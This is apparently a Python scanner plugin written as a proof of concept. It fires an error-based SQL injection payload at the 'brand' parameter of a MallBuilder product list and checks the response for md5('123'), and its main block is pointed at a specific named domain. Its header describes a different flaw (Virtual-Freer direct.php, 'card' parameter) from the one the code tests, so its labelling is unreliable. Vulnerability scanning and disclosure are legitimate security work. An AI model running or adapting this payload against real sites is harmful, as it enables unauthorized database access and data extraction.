#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:Virtual-Freer direct.php card 参数 SQL injection Vulnerability
#Refer:未公布
#Author:烽火戏诸侯

def assign(service, arg):
    if service == 'mallbuilder':
        return True, arg
    
def audit(arg):
    target ='{url}/?orderby=1&s=list&m=product&brand=%27%20AND%20%28SELECT%206071%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20and%27'.format(url=arg)
    
    code, head, res, errcode, _ = curl.curl2(target)
    if '202cb962ac59075b964b07152d234b70' in res:
        security_hole(target)
    
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('mallbuilder','http://haitaobase.cn')[1])
